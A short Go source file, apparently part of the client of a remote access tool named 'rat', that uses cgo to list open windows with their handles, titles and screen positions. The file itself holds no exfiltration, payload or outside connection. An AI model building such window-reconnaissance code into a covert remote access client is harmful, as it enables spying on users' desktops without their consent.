package windows

/*
#include "window.h"
*/
import "C"

import (
	"rat/client/utils"
	"rat/shared"
)

// Windows array, will be populated after call to QueryWindows()
var Windows []shared.Window

// Callback for each window
//export WindowCallback
func WindowCallback(w C.Window) {
	title := utils.WcharToString((*uint16)(w.title), -1)

	window := shared.Window{
		Handle: int(w.handle),
		Title:  title,
		Rect: shared.Rect{
			X:      int(w.rect.x),
			Y:      int(w.rect.y),
			Width:  int(w.rect.width),
			Height: int(w.rect.height),
		},
	}

	Windows = append(Windows, window)
}

func QueryWindows() {
	Windows = make([]shared.Window, 1)

	C.QueryWindows()
}
